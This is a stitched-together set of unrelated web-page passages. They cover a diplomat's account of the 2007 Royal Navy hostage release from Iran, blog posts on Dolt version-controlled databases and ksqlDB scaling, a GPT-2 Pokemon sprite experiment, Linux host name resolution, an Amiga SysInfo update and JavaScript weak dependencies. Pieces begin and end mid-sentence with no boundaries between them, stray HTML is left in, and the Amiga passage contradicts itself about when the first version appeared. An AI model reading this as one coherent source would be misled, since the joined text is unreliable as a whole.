Tehran</figcaption></figure></div><p>They all looked fit and well and were looking forward to going home although rather nervous as to what people would think of their actions during captivity. They asked me my thoughts, I gave no answer.</p><p>Then after much farewell bidding between the hostages and the various Iranian functionaries who were accompanying them, we boarded the plane. The party occupied the front (first/business class) section of the plane, then a curtain was drawn across the aisle to keep them from the view of the journalists at the back who were very noisy and shouting at me for access.</p><p>Also on the plane that had travelled out from the UK were a couple of military people loaded down with mysterious large duffel bags. What was in these bags became clear once we were airborne. They contained uniforms!</p><p>As we left Iranian airspace, the order went out to the sailors and marines from one of the military types that they were to get out of their shiny new suits and back into uniform before landing in UK. They all looked rather startled by this and I think the reality of their situation was beginning to finally dawn on some of them.</p><p>Whatever they felt, they all dutifully got back into uniform. It was hard to believe that each and every uniform fitted them like a glove and they all had the appropriate rank badges. Impressive. Obviously someone back in the UK had done their homework on measurements.</p><p>At last, the plane approached Heathrow much to my relief. I had managed to have a chat with all of them on the flight but myself and my two colleagues had one hell of a job restraining the journalists in the back of the plane. Throughout the flight, they kept on shouting questions and camera lens would be poked through the dividing curtain to try and get the money shot…but their efforts were all in vain.</p><p>Finally, after a smooth landing, the aircraft taxied to the heavily cordoned-off VIP area. The whole party then disembarked from the plane and off they went for their debrief, medicals and reunions with families. Myself and my two colleagues remained on the plane and then left when things had quietened down.</p><p>All manner of things happened after this. The Captain of HMS Cornwall was relieved of his command. An enquiry was set up to look into the affair but it’s conclusions were neither here nor there.</p><div id="gallery-2"><figure><p><a href="https://www.mydiplomaticlife.com/royal-navy-hostages-in-iran-what-really-happened/thumbnail-5/#main"><img width="192" height="335" src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?fit=192%2C335&amp;ssl=1&amp;is-pending-load=1" alt="Royal Navy Hostages In Iran - What Really Happened" aria-describedby="gallery-2-1523" data-lazy-srcset="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?w=192&amp;ssl=1 192w, https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?resize=172%2C300&amp;ssl=1 172w" data-lazy-sizes="(max-width: 192px) 100vw, 192px" data-lazy-src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-5.jpg?fit=192%2C335&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-2-1523"> RN Hostages In Iran</figcaption></figure></div><p>Rumours of a deal involving 5 Iranian detainees held by the US in Iraq and a freed Iranian diplomat abounded.

<p>Using version control to manage your database schema is a very good thing, but it is not a "version controlled database." The goal of this post is to reclaim the term "version control database" for products that actually are databases with version control features. We are not unbiased here. We built <a href="https://doltdb.com/">Dolt</a>, a SQL database with Git-style version control features. We think it will be the category defining product, and we want people to be able to find it.</p>
<h2>Version Controlled Database vs Database Version Control</h2>
<p>To make our case for reclaiming this term, it's worth being precise about the distinction we are trying to draw:

<p>The diagram highlights the nature of the difference between a set of best practices and tools, and a database product:</p>
<ul>
<li>"Database version control" involves using a version control system (VCS) such as Git to version the schema and schema modifications of your database. The database itself knows nothing of its version history. There are many advanced tools and products for this.</li>
<li>A "version controlled database" is a database that stores a full history of its own state, both data and schema.</li>
</ul>
<p>This distinction brings us to the features that define "version controlled databases" as a category: the ability to store a history of its state, along with some version of branching, merging, and diffing across the stored history.</p>
<h2>Why now?</h2>
<p>In a blog entitled <a href="https://medium.com/@karpathy/software-2-0-a64152b37c35">Software 2.0</a>, Andrej Karpathy, a machine learning and artificial intelligence researcher and practitioner, describes a world where computer behavior is increasingly determined by data rather than code. You don't have to be an AI or ML cheerleader to recognize the increasing importance of data in determining the behavior of production systems. Ultimately, the value of data is increasing. Separately, storage costs of data have been in long run secular decline. These two factors combined with the advent of <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a> make it tractable to expose a full data history to a query interface, and therefore to build true version controlled databases.</p>
<h2>Why adopt</h2>
<p>We identified the fundamental features of a version controlled database as both the ability to store a history of the database state, as well as version control primitives such as branching, merging, and diffing.</p>
<h3>Branching and Merging</h3>
<p>Branching and merging are fundamental primitives for collaboration. They allow users to work concurrently against the same base dataset, and then resolve their differences in a principled and robust way. These capabilities differentiate version control databases from existing solutions by enabling users to collaborate on datasets without application layer code. The existing paradigm for databases imagines a single concept of state, and any tools that permit versioning and reconciliation need to be built into the application layer.</p>
<h3>Diffing</h3>
<p>Robust computation of "diffs" is not just useful for review, it is what enables version control systems to effectively implement operations like <code>clone</code> and <code>pull</code>. By implementing efficient diffs across their history, version control databases make for excellent data distribution formats. Users can <code>clone</code> and <code>pull</code> datasets, instantly querying strongly typed data using the database's query interface. The concept of "loading" data becomes redundant, and a whole class of errors defined by data type corruption is eliminated. It shouldn't be necessary to figure out what strings a data vendor uses to signify <code>NULL</code>, it should be native to the distribution format.</p>
<p>These features combine to provide much needed capabilities to data science and data engineering teams, and whoever else might have use for them. In particular</p>
<ul>
<li>collaboration becomes a first class consideration, with the ability for potentially hundreds of users to edit a dataset concurrently and robustly combine the results</li>
<li>experiments and their results become completely reproducible by associating runs with a commit hash of the input data and result set</li>
<li>distribution is transformed from a headache of parsing and loading various data formats which do not provide type guarantees to simply executing <code>clone</code> and <code>pull</code> operations</li>
</ul>
<p>In summary, we believe that version control databases can enable teams with powerful capabilities that they would otherwise have to invest considerable engineering resources in building and maintaining on top of existing database solutions.</p>
<h2>Examples of Version Controlled Databases</h2>
<p>If you've gotten to this point, it's likely that you are at least curious about what the landscape of products in this category of databases looks like. Naturally there are options other than Dolt, and for some use-cases those options might be the best fit.</p>
<h3>TerminusDB</h3>
<p><a href="https://github.com/terminusdb">TerminusDB</a> is a graph database, which means that data is described and queried in terms of graph data structures. It implements its own query language. TerminusDB is inspired by Git, and supports branching, merging and diffing in a Git-like interface.</p>
<h3>Noms</h3>
<p>Dolt is built on top of <a href="https://github.com/attic-labs/noms">Noms</a>. Noms is a Git-like distributed database that provides storage for structured objects defined by Go structs. Noms provides versioning and synchronization primitives for both the object definitions themselves, and values those objects take on. Users interact with Noms via Go code.</p>
<h3>Irmin</h3>
<p><a href="https://github.com/mirage/irmin">Irmin</a> is a storage layer agnostic database inspired by Git, and written in O'Caml. Users define objects in O'Caml that can then be stored using Git-like semantics. It is quite similar in spirit to Noms, but instead of Go structs, users describe, create, and update their data in O'Caml code.</p>
<h3>Dolt</h3>
<p><a href="https://github.com/dolthub/dolt">Dolt</a> is our entry into this novel category of database. Dolt is a SQL database that implements the MySQL standard. Dolt leans heavily on Git, and implements branching, merging, and diff operations, and other Git primitives where relevant.</p>
<h2>Why Dolt</h2>
<p>The choice to implement the MySQL standard as a query interface strongly differentiates Dolt. Other version controlled databases, while interesting, require users to adopt a query interface that suits the database. Dolt takes the opposite position. We believe that SQL is the language of choice for the vast majority of our potential users, and we made the decision to adopt a query interface that suits our users.</p>
<p>As consequence of choosing the MySQL standard is compatibility with a huge ecosystem of tools that connect to Dolt out of the box. A quick look at our <a href="https://www.dolthub.com/docs/integrations/programmatic-clients/">docs</a> shows nine programming languages with tested MySQL connectors that work with Dolt. For folks that know SQL, and one of those nine programming languages, getting started with Dolt should be straight forward.</p>
<p>This design decision does not come without costs. The underlying commit graph storage is not a natural fit for a SQL query engine, and implementing a super set of MySQL on top of that storage layer is a huge technical commitment. Not only are we committed to matching everything MySQL can do, but we also have to design a set of functions to expose the commit graph in our SQL engine.</p>
<h2>Conclusion</h2>
<p>The software industry has long considered version control something that is <em>done to</em> databases, not a <em>feature of</em> databases. At DoltHub we consider "version controlled database" to be a product category, and Dolt is our attempt at a product that fits in that category.</p>
<p>Version control databases are not competitive with the <em>practice</em> of version controlling your database schema, or products that implement that practice. Instead they are a relatively novel category of databases differentiated by features that cater to users who care about capabilities that support collaboration, versioning, reproducibility, and distribution. By making these capabilities native to Dolt we hope to enable users to elevate the quality of their data infrastructure without the need to write and maintain application code, as well as open up possibilities that simply did not exist before.</p>

Despite the ribbing, many people adopt them. Why? Distributed systems give us two things their single node counterparts cannot: scale and fault tolerance.</p>
<p><a href="https://ksqldb.io/" target="_blank" rel="noopener noreferrer">ksqlDB</a>, the event streaming database, is built with a client/server architecture. You can run it with a single server, or you can cluster many servers together. <a href="https://www.confluent.io/blog/how-real-time-stream-processing-works-with-ksqldb">Part 1</a> and <a href="https://www.confluent.io/blog/how-real-time-materialized-views-work-with-ksqldb/">part 2</a> in this series explained how a single server executes <a href="https://www.confluent.io/blog/how-real-time-stream-processing-works-with-ksqldb/">stateless</a> and <a href="https://www.confluent.io/blog/how-real-time-materialized-views-work-with-ksqldb/">stateful</a> operations. This post is about how these work when ksqlDB is deployed with many servers, and more importantly how it linearly scales the work it is performing—even in the presence of faults.</p>

<h2 id="scaling-workloads"><a id="scaling-workloads"></a>Scaling workloads</h2>
<p>When you <em>scale</em> ksqlDB, you add more servers to parallelize the work that it is performing—making it process data faster. But before we discuss how a distributed ksqlDB cluster works, let’s briefly review a single-node setup. Suppose you have a stream of monitoring data:</p>
<pre><code>
CREATE STREAM readings (
    sensor VARCHAR KEY,
    area VARCHAR,
    reading INT
) WITH (
    kafka_topic = 'readings',
    partitions = 8,
    value_format = 'json'
);</code></pre>
<p>Whose events look like:</p>
<pre><code>

INSERT INTO readings (sensor, area, reading) VALUES ('sensor-2', 'motor', 64);

<p>You can transform this stream into another by submitting a persistent query. Each time you run a persistent query, ksqlDB’s server compiles the query’s textual representation into a physical execution plan in the form of a Kafka Streams topology. The topology runs as a daemon forever, reacting to new rows as soon as they become available. This means that all processing happens on ksqlDB’s server; no processing work happens on the Apache Kafka® brokers. It looks roughly like this:</p>

<p>Now, when you add more servers to your cluster, ksqlDB spreads out the workload as much as possible. Just as a busy bank with a long line of customers adds more tellers, ksqlDB divides the work and assigns it to the servers. Because each server performs only a fraction of the total work, they can operate more efficiently, instead of wasting resources context switching.</p>
<p>But what does it really mean for ksqlDB to divide up a persistent query’s work? In Kafka, the unit of parallelism is the partition, and ksqlDB takes after its companion. Every persistent query reads rows from at least one input stream or table. ksqlDB examines the total number of partitions of those inputs, divides it by the number of servers, and assigns each server its share.</p>
<p>When we add a second ksqlDB server to our example, each server now processes only four input partitions (because eight partitions divided by two servers is four). From here on out, each persistent query in an animation will have a letter in parentheses after it. The letter distinguishes which server the query is running on. For instance, in the next animation, <code>a</code> and <code>b</code> are the fictitious names of two ksqlDB servers.</p>

<p>By adding a second server to the cluster, the processing power of ksqlDB has doubled. This phenomenon is called linear scalability: Each time you add another server, the processing power of the cluster rises in proportion to the previous cluster size (up to a limit, as we’ll see). All you need to do to make this happen is configure each ksqlDB server with the same <code>ksql.service.id</code> server configuration value. If multiple ksqlDB servers with the same service ID connect to the same Kafka cluster, they will form a ksqlDB cluster and share the workload.</p>
<p>The architecture scales, but how is the mapping of input partitions to servers chosen? To answer that question, we need to pierce through several layers of ksqlDB’s architecture, all the way down to its Kafka clients. In Kafka, consumers have two options to read data from partitions. They can either assign themselves partitions and process all the data, or they can join a consumer group. A consumer group is a collection of consumers that coalesce under a common name to divide the partition data.</p>
<p>Consumer groups are a powerful primitive to build on because they machete through a forest of thorny problems. We’ve already seen how they handle work sharing, evenly dividing up a body of data across a set of replica programs. They also perform dynamic load balancing—as servers join and leave the cluster, the mapping of partitions to servers is automatically updated. Finally, they are resilient to faults. If a server experiences a failure that makes it unable to continue, the consumer group will detect it, boot it out of the group, and <a href="https://www.confluent.io/blog/cooperative-rebalancing-in-kafka-streams-consumer-ksqldb/">incrementally adjust the mapping</a>.</p>
<p>Another positive consequence of building on top of Kafka is that it’s easy to determine the optimal ksqlDB cluster size for processing parallelism. By deploying the same number of ksqlDB servers as persistent query input partitions, you achieve a pleasing degree of parallelism:</p>

<p>Notice that compared to the first animation, this one isn’t sped up. Each record still takes the same amount of time to process. The difference is that the records are being processed in parallel eight ways, instead of serially, making the total duration 8x shorter.</p>
<p>This design implies that any surplus ksqlDB servers will remain idle. For example, if you deploy 10 servers and there are only eight input partitions (for all running queries), two of them will remain idle. I’ve exercised a small creative liberty so far and implied that each ksqlDB server can only execute one query at a time, but how it works is slightly more nuanced than that. It’s easier to understand that model at first, but in reality, each server runs all submitted queries. To control how this works, you can control how much parallelism (how many total threads) a given query will use across each server with the <a href="https://docs.ksqldb.io/en/latest/operate-and-deploy/installation/server-config/config-reference/#ksqlstreamsnumstreamthreads" target="_blank" rel="noopener noreferrer"><code>ksql.streams.num.stream.threads</code></a> query configuration parameter (which defaults to four). Suppose that you have five servers and you deploy a query with the stream threads parameter set to 6. Each server will run 6 threads, meaning that the cluster will run a total of 30 threads for the query. If the query has 25 input partitions, 5 of the threads will remain idle.</p>

<p>Let’s now turn our attention to the second half of this blog post: <em>fault tolerance</em>. Fault tolerance is how ksqlDB continues to function correctly when something goes wrong. The way that ksqlDB recovers from a problem depends on what it was doing in the first place. For our purposes, there are two categories of operations that ksqlDB can run: stateless and stateful.</p>
<p>Stateless operations are programs that don’t need to remember anything in between the rows it processes. For example, a program that uppercases a name column is stateless. It does the same thing for every row, …</p></div></div></div></div></section></div></div></div></div>

                <h4>by <a href="http://matthewrayfield.com/">Matthew Rayfield</a> on November 11th 2020</h4>

                <p>
                    <iframe width="560" height="315" src="https://www.youtube.com/embed/Z9K3cwSL6uM" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>
                </p>

                <h2>Text Generation for Images</h2>

                <p>
                    A few months back I started messing around with <a href="https://github.com/minimaxir/gpt-2-simple" target="_blank">gpt-2-simple</a>. Inspired by a few of the more unusual uses like <a href="https://twitter.com/theshawwn/status/1212272510470959105" target="_blank">chess playing</a> and <a href="https://www.gwern.net/GPT-2-music" target="_blank">MIDI generation</a> I wanted to find something funky I could do with it myself. Image generation quickly came to mind. I figured if I converted a bunch of small images (in this case pokemon) into text files, re-trained GPT-2 with them, then converted the output back into images I would at least get <b>something</b>. To my surprise the results were actually pretty good !
                </p>

                <h2>Text Format</h2>

                <p>
                    After a few attempts that resulted in a sea of noisy pixels I settled on the following format:
                </p>

                <pre>32d ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ! ` &gt; ` &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; ! &gt; &gt; ! ! &gt; &gt; &gt; &gt; &gt; ! &gt; &gt; ! &gt; &gt; &gt; &gt; ! ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
33d ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ &gt; &gt; ! &gt; &gt; &gt; ! ! &gt; &gt; &gt; ! &gt; &gt; ! ` ` ! &gt; &gt; &gt; ! ! &gt; ! &gt; &gt; &gt; &gt; &gt; ! ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
34d ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ! ` ! ` ! &gt; &gt; ! ! &gt; &gt; &gt; ! &gt; ! ! ! ` ` ! &gt; &gt; ! ! ! ! ! &gt; &gt; &gt; &gt; ! ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
35d ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ! ` ! ` U &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; ` U ! ` ` ! &gt; &gt; ! &gt; &gt; ! ! &gt; ! &gt; &gt; ! ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
36d ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ! &gt; ! ` U ! &gt; &gt; &gt; &gt; &gt; &gt; &gt; ! ` U ! ` ` ! &gt; &gt; ! &gt; &gt; &gt; &gt; &gt; ! &gt; ! &gt; ! ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~</pre>

                <p>You could probably already tell, but the above text is Bulbasaur's eyes. The format is simply line number, direction of image (up or down), and finally each pixel in that row represented as single characters seperated by spaces. The pixel color to character transformation is quite simple and can be seen <a href="https://github.com/MatthewRayfield/pokemon-gpt-2/blob/main/image-to-text.py#L32" target="_blank">here</a>.</p>

                <h2>Results</h2>

                <p>Training GPT-2 with a bunch of text is super easy. The trickiest part was writing code to manage those results into something usable. My "<a href="https://github.com/MatthewRayfield/pokemon-gpt-2/blob/main/generate.py" target="_blank">generation</a>" code does this. In this way it's not at all generating, but instead normalizing output and feeding input to GPT-2.</p>

                <p>First it gets a few lines to start off with. Keeps the good lines, throws out the rest. Then it feeds in a few lines and has GPT-2 carry on from there. Then it repeats these steps until all 64 lines are filled, converts to an image, and saves the results.</p>

                <p>After quite a few hours of training and generating (on Google Colab) we get stuff like this:</p>

                <div>
                    <p><img src="https://matthewrayfield.com/articles/ai-generated-pokemon-sprites-with-gpt-2/sprites.png" alt=""></p><p>6 hand picked pokes</p>
                </div>

                <p>
                    The above examples are,of course, hand picked. Most of the output sprites look pretty odd, but they do usually capture the Pokemon essence. You can see &gt;3000 more generated sprites <a href="https://matthewrayfield.com/projects/ai-pokemon/" target="_blank">here</a>.
                </p>

                <h2>Illustrated</h2>

                <p>
                    With all the interesting quirks of the generated sprites, I was quite keen on seeing how they would look if "redrawn" as illustrations. I was fortunate to come across the work of <a href="https://twitter.com/raciebeep" target="_blank">Rachel Briggs</a> who has made a name for herself drawing other Pokemon that don't officially exist like the <a href="http://racieb.meowcorp.us/gallery/illustration" target="_blank">Space World '97 Pokemon</a>. I reached out to her and thankfully she was up to the task of drawing these monsters, and she absolutely killed it !
                </p>

                <p>
                    I love these and I couldn't be happier with how they turned out ! Rachel did an amazing job pulling out details from just a few pixels.
                </p>

                <h2>The End</h2>

                <p>
                    So will you be seeing Pokemon sprites generated with this technique in the next game ? No. Because they use 3D now.
                </p>

                <p>
                    All code for this project is available at <a href="https://github.com/MatthewRayfield/pokemon-gpt-2" target="_blank">https://github.com/MatthewRayfield/pokemon-gpt-2</a>. There you will also find links to Google Colab notebooks where you can perform all training and image generation with a free GPU.
                </p>

                <p><strong>NOTE:</strong> I started this project in APRIL 2020 but did not finish it until NOVEMBER 2020. Not that it was a lot of work, I'm just slow. BUT in the mean time OpenAI themselves (creators of GPT-2) developed their own (i'm sure much better) technique for image generation with GPT. More info about that can be found here: <a href="https://openai.com/blog/image-gpt/" target="_blank">https://openai.com/blog/image-gpt/</a>.

</pre> </details> <h4 id="systemd-resolved-resolve"><code>systemd-resolved</code> (<code>resolve</code>)</h4> <p>The <a href="https://www.freedesktop.org/software/systemd/man/nss-resolve.html"><code>resolve</code> plug-in module</a> delegates host name resolution to a local <a href="https://www.freedesktop.org/software/systemd/man/systemd-resolved.service.html"><code>systemd-resolved</code> daemon</a>. The features of systemd-resolved are explained afterwards but include: mDNS, LLMNR, caching, etc.</p> <p>The plugin and the <code>systemd-resolved</code> daemon communicate over <a href="https://www.freedesktop.org/wiki/Software/dbus/">D-Bus</a>. They use the <code>ResolveHostname()</code> method of the <a href="https://www.freedesktop.org/wiki/Software/systemd/resolved/"><code>org.freedesktop.resolve1.Manager</code> interface</a>:</p> <div><pre><span></span><code><span>node /org/freedesktop/resolve1 {</span>

</code></pre></div> <p>We can test host name resolution through <code>systemd-resolved</code> with:</p> <div><pre><span></span><code>resolvectl -4 query www.example.com
resolvectl -6 query www.example.com
systemd-resolve -4 www.example.com
systemd-resolve -6 www.example.com
</code></pre></div> <p><strong>Note:</strong> If for some reason, a program cannot communicate to <code>systemd-resolved</code>, through D-Bus (for example because it does not use NSS), it can still make queries to <code>systemd-resolved</code> using the DNS protocol. <code>systemd-resolved</code> listens on <code>127.0.0.53</code> (TCP and UDP ports 53). When systemd-resolved is enabled, this IP address is usually configured in <code>/etc/resolv.conf</code>; therefore, the <code>dns</code> module or any other software relying on <code>/etc/resolv.conf</code> will end up communicating to systemd-resolved using the standard DNS protocol.</p> <h4 id="lwresd-cache-lwres">lwresd cache (<code>lwres</code>)</h4> <p>The <code>lwres</code> plug-in module implements system-wide caching for DNS resolutions. It communicates with an associated system daemon (<code>lwresd</code>). This daemon is a caching daemon (based on BIND) which forwards the queries to the resolvers defined in the <code>/etc/resolv.conf</code> file (not through NSS) and caches the answers.</p> <h4 id="dns-based-host-name-resolution-dns">DNS based host name resolution (<code>dns</code>)</h4> <p>The <code>dns</code> plug-in module implements host name resolution using the standard DNS protol. This plug-in module uses the <code>/etc/resolv.conf</code> file to find a list of resolvers to communicate to. These resolvers might be local resolvers such as dnsmasq, unbound or systemd-resolved or remote resolvers.</p> <h4 id="myhostname"><code>myhostname</code></h4> <p>The <a href="https://www.freedesktop.org/software/systemd/man/nss-myhostname.html"><code>myhostname</code> plug-in module</a> resolves the name of the machine and <code>localhost</code>. These are traditionnaly handled by the <code>files</code> module.</p> <p>In addition, this module handles:</p> <ul> <li>any hostname in the <code>localhost</code> domain (eg. <code>foobar.localhost</code>) <a href="https://tools.ietf.org/html/rfc6761#section-6.3">as mandated by RFC6761</a>;</li> <li><code>_gateway</code> as the IP addresses of the default gateways.</li> </ul> <p>All these are also resolved by <code>systemd-revolved</code>. The <code>myhostname</code> module is supposed to be useful as a fallback if <code>systemd-resolved</code> is unavailable.</p> <h3 id="nscd">NSCD</h3> <p>The GNU C library includes builtin support for an optional daemon, the Name Service Cache Daemon (NSCD), for caching all NSS requests (not only host names resolutions). When enabled, it listens on the <code>/run/nscd/socket</code> Unix socket.</p> <p>This features is not implemented as a NSS plug-in module. The GNU C library always tries to contact this service for NSS requests before going through the NSS plug-in modules.</p> <p>The NSCD daemon itself uses the NSS plug-in modules declared in <code>/etc/nsswitch.conf</code>.</p> <p>This daemon is usually not installed and is apparently <a href="https://jameshfisher.com/2018/02/05/dont-use-nscd/">not very stable</a>.</p> <h2 id="managing-resolvconf-files">Managing <code>resolv.conf</code> files</h2> <p>The <code>/etc/resolv.conf</code> file defines which resolvers are used by the <code>dns</code> NSS module (with the <code>nameserver</code> directive).</p> <p>It can contain:</p> <ul> <li>IP addresses of resolverss to use (<code>nameserver</code> directive);</li> <li>domain names to use for resolving dotless host names (<code>search</code> directive);</li> <li>misc. options (<code>options</code> directive) such as,<ul> <li>enabling <a href="https://tools.ietf.org/html/rfc6891">EDNS0</a> (<code>options edns0</code>),</li> <li>forcing DNS-over-TDP instead of DNS-over-UDP (<code>options vc</code>)<sup id="fnref:vc"><a href="https://www.gabriel.urdhr.fr/2020/04/20/linux-host-name-resolution/#fn:vc">9</a></sup>;</li> </ul> </li> <li>ranges of IP addresses to use in priority when contacting resolved hosts (<code>sortlist</code> directive).</li> </ul> <p>Example of <code>revolv.conf</code> file:</p> <pre>nameserver 10.0.0.42
nameserver 10.0.1.42
</pre> <p>The programs which manage the network configuration (DHCP clients, VPN programs) usually want to reconfigure this file somehow.</p> <h3 id="the-resolvconf-interface">The <code>resolvconf</code> interface</h3> <p>In order to avoid inconsistent state of the <code>/etc/resolv.conf</code> file resulting from different programs trying to configure it, the <code>resolvconf</code> program can be used. The idea is that different programs can register domain name configurations associated to different network interfaces and <code>resolvconf</code> merges them in a a <code>resolv.conf</code> file.</p> <p>When <code>resolvconf</code> is installed, <code>/etc/resolv.conf</code> is typically a symlink to <code>/run/resolvconf/resolv.conf</code>:</p> <ul> <li><code>resolvconf</code> manages <code>/run/resolvconf/resolv.conf</code> directly;</li> <li><code>/etc/resolv.conf</code> is either a symlink to <code>/run/resolvconf/resolv.conf</code> or to another file (if some local resolver suh as unbound is running).</li> </ul> <p>A component of the system can <a href="https://manpages.debian.org/buster/resolvconf/resolvconf.8.en.html">register a DNS configuration for an interface</a> by sending some <code>resolv.conf</code> directives to the standard input of a <code>resolvconf -a IFACE</code> command:</p> <div><pre><span></span><code>resolvconf -a eth0.dhclient <span>&lt;&lt; EOF</span>
<span>nameserver 10.0.0.42</span>
<span>nameserver 10.0.1.42</span>
<span>EOF</span>
</code></pre></div> <p>The configuration for an interface is unregistered with:</p> <div><pre><span></span><code>resolvconf -d eth0.dhclient
</code></pre></div> <p>Many programs can use this interface (usually through hooks):</p> <ul> <li>DHCP clients (eg. <code>dhclient</code>) can configure the resolvers received by DHCP.</li> <li>PPP daemons (eg. <code>pppd</code>) can configures resolvers advertised by the peer.</li> <li><code>ifup</code>/<code>ifdown</code> can configure the resolvers which are declared statically in <code>interfaces</code> files.</li> <li>OpenVPN when used as a VPN client can configure resolvers advertised by the VPN server.</li> <li>NetworkManager can configure statically or dynamically configured resolvers.</li> </ul> <p>See below for some details about this.</p> <p>There are several (at least three) implementations of this program:</p> <ul> <li>traditional <code>resolvconf</code>;</li> <li><a href="https://roy.marples.name/projects/openresolv/"><code>openresolv</code></a>;</li> <li><code>systemd-resolve</code>.</li> </ul> <h3 id="traditional-resolvconf">Traditional <code>resolvconf</code></h3> <p>The <a href="https://manpages.debian.org/buster/resolvconf/interface-order.5.en.html"><code>/etc/resolvconf/interface-order</code> file</a> defines a priority of interfaces. Interfaces listed first in this file will have higher priority. Their DNS configuration (eg. DNS servers) will have precedence over the …</p></article></section></div></div>

<p>SysInfo is one of the most loved benchmark tool applications made for the Amiga. On almost every Amiga event or party. SysInfo is used to check the performances of the Amiga computers. It is a nice program that can either run from a floppy or from a hard drive directly. </p>
<p>This benchmark tool is used by many Amiga users at various meetings. It is used for getting information about the Classic Amiga system like OS and library versions, hardware revisions, and stuff. </p>
<p>I have seen SysInfo being used by the leading Classic Amiga supporters such as Warp Team at CS LABS, and Apollo Team. SysInfo was also used a lot at the Amiga34 meeting in Neuss, Germany. For many PC and Mac users, it might be quite odd to see people get big eyes of performance differences between 14MHz and 75MHz. But that’s how we do it in the Amiga world! </p>
<h2>A whopping 19 Years of Silence</h2>
<p>The very first version of SysInfo came out back in 2012 after 19 years of silence. Tobias ‘Geijer’ Geijersson is now the maintainer of the program as Nic Wilson gave him permission to do so. </p>
<p>Since 2012, Tobias has released 3 updates after that year. All of them with the latest one released on the 11th of November 2020, which makes 2020 a much better year for sure for Amiga users. Tobias got the energy to update this benchmark tool that is loved so much by Amiga users all over the world.</p>
<h3>Important SysInfo 4.4 (11-Nov-20)</h3>
<ul><li>Changed handling of speed numbers, if big, don’t print decimals</li><li>Replaced “Chip Speed vs A600” algorithm to use a lot fewer instructions and a lot more CHIP mem accesses resulting in a more relevant value. This results in a significantly lower value for machines with an instruction cache (68020+), which is more accurate because the instruction cache should not affect CHIPMEM access speed.</li><li>Added support for AC68080 frequency support</li><li>The update will no longer try to open 68040/68060.library when there is no such CPU</li><li>Bugfix: 68040/68060 non-FPU guru fixed, again!</li><li>Lots of updates/corrections in the SysInfo.guide documentation.</li><li>Lots of code cleanup</li></ul>
<p>It is great to see SysInfo getting updates. Tobias is making sure that the Vampire 68080 accelerators are getting support too which is great. CS LABS is also providing Warp cards with 100MHz 68060’s too. So good times for Classic Amiga benchmark lovers out there. </p>

<![CDATA[The Case for Weak Dependencies in JavaScript]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Earlier today, I was briefly entertaining the idea of writing a library to wrap and enhance querySelectorAll in certain ways. I thought I’d rather not introduce a <a href="http://projects.verou.me/parsel/">Parsel</a> dependency out of the box, but only use it to parse selectors properly when it’s available, and use more crude regex when it’s not (which would cover most use cases for what I wanted to do).</p>



<p>In the olden days, where every library introduced a global, I could just do:</p>



<pre><code>if (window.Parsel) {
	let ast = Parsel.parse();
	// rewrite selector properly, with AST
}
else {
	// crude regex replace
}</code></pre>



<p>However, with ESM, there doesn’t seem to be a way to detect whether a module is imported, without actually importing it yourself.</p>



<p>I <a href="https://twitter.com/LeaVerou/status/1329389035249422336">tweeted</a> about this…</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>One issue with ESM (and other module systems) is that you can't have optional dependencies. </p><p>With globals, you could check if a global existed and branch accordingly. With modules, you can't check if a module is available/loaded without importing it from somewhere.</p></div>— Lea Verou (@LeaVerou) <a href="https://twitter.com/LeaVerou/status/1329389035249422336?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p>I thought this was a common paradigm, and everyone would understand why this was useful. However, I was surprised to find that most people were baffled about my use case. Most of them thought I was either talking about conditional imports, or error recovery after failed imports.</p>



<p>I suspect it might be because my primary perspective for writing JS is that of a library author, where I do not control the host environment, whereas for most developers, their primary perspective is that of writing JS for a specific app or website.</p>



<p>After <a href="https://twitter.com/LeaVerou/status/1329389035249422336">Kyle Simpson asked me to elaborate</a> about the use case, I figured a blog post was in order.</p>



<p>The use case is essentially <strong>progressive enhancement</strong> (in fact, I toyed with the idea of titling this blog post <em><strong>“Progressively Enhanced JS”</strong></em>). If library X is loaded already by other code, do a more elaborate thing and cover all the edge cases, otherwise do a more basic thing. It’s for dependencies that are not really <strong>depend</strong>encies, but more like <strong>nice-to-haves</strong>.</p>



<p>We often see modules that do things really well, but use a ton of dependencies and add a lot of weight, even to the simplest of projects, because they need to cater to all the edge cases that we may not care about. We also see modules that are dependency free, but that’s because lots of things are implemented more crudely, or certain features are not there.</p>



<p>This paradigm gives you the best of both worlds: <strong>Dependency free</strong> (or low dependency) modules, that can use what’s available to improve how they do things with <strong>zero additional impact</strong>. </p>



<p>Using this paradigm, the <strong>size of these dependencies is not a concern</strong>, because they are <strong>optional peer dependencies</strong>, so one can pick the best library for the job without being affected by bundle size. Or even use multiple! One does not even need to pick one dependency for each thing, they can support bigger, more complete libraries when they’re available and fall back to micro-libraries when they are not.</p>



